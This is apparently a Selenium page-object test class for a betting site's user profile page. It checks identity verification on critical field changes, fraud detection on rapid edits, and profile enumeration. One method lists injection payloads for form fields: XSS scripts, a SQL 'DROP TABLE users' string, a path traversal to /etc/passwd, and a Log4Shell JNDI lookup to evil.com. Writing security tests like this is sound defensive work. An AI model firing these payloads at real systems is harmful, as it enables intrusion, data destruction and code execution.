from selenium.webdriver.common.by import By
from pages.base_page import BasePage
import time
from faker import Faker

fake = Faker()

class ProfilePage(BasePage):
    """User profile page object model"""
    
    # Personal information fields
    FIRST_NAME_FIELD = (By.ID, "first-name")
    LAST_NAME_FIELD = (By.ID, "last-name")
    EMAIL_FIELD = (By.ID, "email")
    PHONE_FIELD = (By.ID, "phone")
    DATE_OF_BIRTH_FIELD = (By.ID, "date-of-birth")
    ADDRESS_FIELD = (By.ID, "address")
    
    # Financial information fields
    BANK_ACCOUNT_FIELD = (By.ID, "bank-account")
    PAYMENT_METHOD_FIELD = (By.ID, "payment-method")
    CARD_NUMBER_FIELD = (By.ID, "card-number")
    
    # Action buttons
    SAVE_BUTTON = (By.ID, "save-profile")
    CANCEL_BUTTON = (By.ID, "cancel-profile")
    EDIT_BUTTON = (By.ID, "edit-profile")
    
    # Verification elements
    VERIFICATION_STATUS = (By.ID, "verification-status")
    VERIFY_IDENTITY_BUTTON = (By.ID, "verify-identity")
    VERIFICATION_BADGE = (By.CLASS_NAME, "verified-badge")
    PENDING_VERIFICATION = (By.CLASS_NAME, "pending-verification")
    
    # Security elements
    CHANGE_PASSWORD_BUTTON = (By.ID, "change-password")
    TWO_FA_TOGGLE = (By.ID, "two-fa-toggle")
    SECURITY_QUESTIONS = (By.ID, "security-questions")
    
    # Messages and alerts
    SUCCESS_MESSAGE = (By.CLASS_NAME, "profile-success")
    ERROR_MESSAGE = (By.CLASS_NAME, "profile-error")
    VERIFICATION_REQUIRED_WARNING = (By.CLASS_NAME, "verification-required")
    SECURITY_ALERT = (By.CLASS_NAME, "security-alert")
    
    # Betting limits section
    BETTING_LIMITS_SECTION = (By.ID, "betting-limits")
    DAILY_LIMIT_SETTING = (By.ID, "daily-limit-setting")
    MONTHLY_LIMIT_SETTING = (By.ID, "monthly-limit-setting")
    SET_LIMITS_BUTTON = (By.ID, "set-limits")
    
    def __init__(self, driver):
        super().__init__(driver)
        self.page_url = "/profile"
    
    def wait_for_profile_page_load(self):
        """Wait for profile page to load"""
        try:
            self.wait_for_visible(self.FIRST_NAME_FIELD, timeout=10)
            self.logger.info("Profile page loaded successfully")
            return True
        except Exception as e:
            self.logger.error(f"Profile page failed to load: {str(e)}")
            return False
    
    def get_current_profile_data(self):
        """Get current profile data"""
        try:
            profile_data = {
                "first_name": self.get_field_value(self.FIRST_NAME_FIELD),
                "last_name": self.get_field_value(self.LAST_NAME_FIELD),
                "email": self.get_field_value(self.EMAIL_FIELD),
                "phone": self.get_field_value(self.PHONE_FIELD),
                "date_of_birth": self.get_field_value(self.DATE_OF_BIRTH_FIELD),
                "address": self.get_field_value(self.ADDRESS_FIELD),
                "bank_account": self.get_field_value(self.BANK_ACCOUNT_FIELD),
                "payment_method": self.get_field_value(self.PAYMENT_METHOD_FIELD)
            }
            return profile_data
        except Exception as e:
            self.logger.error(f"Failed to get profile data: {str(e)}")
            return {}
    
    def get_field_value(self, locator):
        """Get field value"""
        try:
            element = self.find_element(locator)
            return element.get_attribute("value") or element.text
        except:
            return ""
    
    def is_verified_user(self):
        """Check if user is verified"""
        return self.is_element_visible(self.VERIFICATION_BADGE)
    
    def get_verification_status(self):
        """Get verification status"""
        try:
            return self.get_text(self.VERIFICATION_STATUS)
        except:
            return "Unknown"
    
    def click_edit_profile(self):
        """Click edit profile button"""
        return self.click_element(self.EDIT_BUTTON)
    
    def update_field(self, locator, new_value):
        """Update a specific field"""
        try:
            success = self.enter_text(locator, new_value, clear_first=True)
            if success:
                self.logger.info(f"Updated field with value: {new_value}")
            return success
        except Exception as e:
            self.logger.error(f"Failed to update field: {str(e)}")
            return False
    
    def save_profile(self):
        """Save profile changes"""
        return self.click_element(self.SAVE_BUTTON)
    
    def cancel_profile_changes(self):
        """Cancel profile changes"""
        return self.click_element(self.CANCEL_BUTTON)
    
    def update_profile(self, profile_data, save=True):
        """Update profile with new data"""
        try:
            self.logger.info("Updating profile data")
            
            # Click edit if needed
            if self.is_element_visible(self.EDIT_BUTTON):
                self.click_edit_profile()
                time.sleep(1)
            
            # Update fields
            field_map = {
                "first_name": self.FIRST_NAME_FIELD,
                "last_name": self.LAST_NAME_FIELD,
                "email": self.EMAIL_FIELD,
                "phone": self.PHONE_FIELD,
                "date_of_birth": self.DATE_OF_BIRTH_FIELD,
                "address": self.ADDRESS_FIELD,
                "bank_account": self.BANK_ACCOUNT_FIELD,
                "payment_method": self.PAYMENT_METHOD_FIELD
            }
            
            updated_fields = []
            for field_name, new_value in profile_data.items():
                if field_name in field_map and new_value:
                    success = self.update_field(field_map[field_name], new_value)
                    if success:
                        updated_fields.append(field_name)
            
            # Save or cancel
            if save:
                save_success = self.save_profile()
            else:
                save_success = self.cancel_profile_changes()
            
            # Wait for response
            time.sleep(2)
            
            # Check for messages
            result = {
                "updated_fields": updated_fields,
                "save_attempted": save,
                "save_success": save_success,
                "error_displayed": self.is_error_displayed(),
                "success_displayed": self.is_success_displayed(),
                "verification_required": self.is_verification_required_warning_displayed()
            }
            
            if result["error_displayed"]:
                result["error_message"] = self.get_error_message()
            
            if result["success_displayed"]:
                result["success_message"] = self.get_success_message()
            
            if result["verification_required"]:
                result["verification_warning"] = self.get_verification_required_warning()
            
            return result
            
        except Exception as e:
            self.logger.error(f"Profile update failed: {str(e)}")
            return {"error": str(e), "updated_fields": []}
    
    def get_error_message(self):
        """Get error message"""
        try:
            return self.get_text(self.ERROR_MESSAGE)
        except:
            return ""
    
    def get_success_message(self):
        """Get success message"""
        try:
            return self.get_text(self.SUCCESS_MESSAGE)
        except:
            return ""
    
    def is_error_displayed(self):
        """Check if error message is displayed"""
        return self.is_element_visible(self.ERROR_MESSAGE)
    
    def is_success_displayed(self):
        """Check if success message is displayed"""
        return self.is_element_visible(self.SUCCESS_MESSAGE)
    
    def is_verification_required_warning_displayed(self):
        """Check if verification required warning is displayed"""
        return self.is_element_visible(self.VERIFICATION_REQUIRED_WARNING)
    
    def get_verification_required_warning(self):
        """Get verification required warning message"""
        try:
            return self.get_text(self.VERIFICATION_REQUIRED_WARNING)
        except:
            return ""
    
    def attempt_critical_field_updates_without_verification(self):
        """
        Test updating critical fields without proper verification
        This should trigger security warnings
        """
        self.logger.info("Testing critical field updates without verification")
        
        critical_updates = {
            "email": fake.email(),
            "phone": fake.phone_number(),
            "bank_account": fake.iban(),
            "payment_method": "New Credit Card"
        }
        
        results = []
        
        for field_name, new_value in critical_updates.items():
            self.logger.info(f"Testing update of {field_name} without verification")
            
            # Attempt to update single field
            test_data = {field_name: new_value}
            result = self.update_profile(test_data)
            result["field_tested"] = field_name
            result["test_value"] = new_value
            result["security_test"] = "unverified_critical_update"
            
            # Check if security measures triggered
            if result.get("verification_required"):
                result["security_working"] = True
                self.logger.info(f"Security check passed for {field_name}")
            elif result.get("error_displayed"):
                error_msg = result.get("error_message", "").lower()
                if "verification" in error_msg or "identity" in error_msg:
                    result["security_working"] = True
                else:
                    result["security_working"] = False
            else:
                result["security_working"] = False
                self.logger.warning(f"Critical field {field_name} updated without verification!")
            
            results.append(result)
            
            # Small delay between attempts
            time.sleep(1)
        
        return results
    
    def test_rapid_profile_changes(self, change_count=5, delay=0.5):
        """Test rapid profile changes to trigger fraud detection"""
        self.logger.info("Testing rapid profile changes")
        results = []
        
        for i in range(change_count):
            # Generate random changes
            test_data = {
                "first_name": fake.first_name(),
                "last_name": fake.last_name(),
                "address": fake.address()
            }
            
            start_time = time.time()
            result = self.update_profile(test_data)
            result["attempt"] = i + 1
            result["response_time"] = time.time() - start_time
            result["rapid_change_test"] = True
            
            # Check for fraud detection indicators
            error_msg = result.get("error_message", "").lower()
            if "rapid" in error_msg or "frequent" in error_msg or "cooldown" in error_msg:
                result["fraud_detection_triggered"] = True
                self.logger.warning(f"Fraud detection triggered on attempt {i+1}")
            else:
                result["fraud_detection_triggered"] = False
            
            results.append(result)
            
            # Stop if fraud detection triggered
            if result.get("fraud_detection_triggered"):
                break
            
            time.sleep(delay)
        
        return results
    
    def test_malicious_data_injection(self):
        """Test injection of malicious data in profile fields"""
        self.logger.info("Testing malicious data injection")
        
        malicious_payloads = [
            "<script>alert('XSS')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        
        results = []
        
        for payload in malicious_payloads:
            self.logger.info(f"Testing malicious payload: {payload[:50]}...")
            
            # Test payload in different fields
            test_fields = ["first_name", "last_name", "address"]
            
            for field in test_fields:
                test_data = {field: payload}
                result = self.update_profile(test_data, save=False)
                result["payload"] = payload
                result["field_tested"] = field
                result["malicious_injection_test"] = True
                
                # Check if payload was properly sanitized
                if result.get("success_displayed") and not result.get("error_displayed"):
                    # Check if the payload appears in the field value
                    current_value = self.get_field_value(getattr(self, f"{field.upper()}_FIELD"))
                    if payload in current_value:
                        result["injection_successful"] = True
                        result["security_risk"] = "HIGH"
                        self.logger.warning(f"Malicious payload accepted in {field}: {payload}")
                    else:
                        result["injection_successful"] = False
                        result["security_risk"] = "LOW"
                else:
                    result["injection_successful"] = False
                    result["security_risk"] = "LOW"
                
                results.append(result)
                time.sleep(0.5)
        
        return results
    
    def test_profile_enumeration(self, user_ids):
        """Test profile enumeration vulnerability"""
        self.logger.info("Testing profile enumeration")
        results = []
        
        for user_id in user_ids:
            try:
                # Attempt to access other user's profile
                profile_url = f"/profile/{user_id}"
                self.driver.get(profile_url)
                
                time.sleep(2)
                
                # Check if unauthorized access is allowed
                current_url = self.get_current_url()
                page_loaded = self.wait_for_profile_page_load()
                
                result = {
                    "user_id": user_id,
                    "url_attempted": profile_url,
                    "current_url": current_url,
                    "page_loaded": page_loaded,
                    "unauthorized_access": page_loaded and str(user_id) in current_url,
                    "enumeration_test": True
                }
                
                if result["unauthorized_access"]:
                    result["security_risk"] = "HIGH"
                    self.logger.warning(f"Unauthorized access to user {user_id} profile!")
                else:
                    result["security_risk"] = "LOW"
                
                results.append(result)
                
            except Exception as e:
                result = {
                    "user_id": user_id,
                    "error": str(e),
                    "unauthorized_access": False,
                    "security_risk": "LOW"
                }
                results.append(result)
        
        return results
    
    def set_betting_limits(self, daily_limit=None, monthly_limit=None):
        """Set betting limits"""
        try:
            if not self.is_element_visible(self.BETTING_LIMITS_SECTION):
                self.logger.warning("Betting limits section not visible")
                return False
            
            if daily_limit:
                self.update_field(self.DAILY_LIMIT_SETTING, str(daily_limit))
            
            if monthly_limit:
                self.update_field(self.MONTHLY_LIMIT_SETTING, str(monthly_limit))
            
            return self.click_element(self.SET_LIMITS_BUTTON)
            
        except Exception as e:
            self.logger.error(f"Failed to set betting limits: {str(e)}")
            return False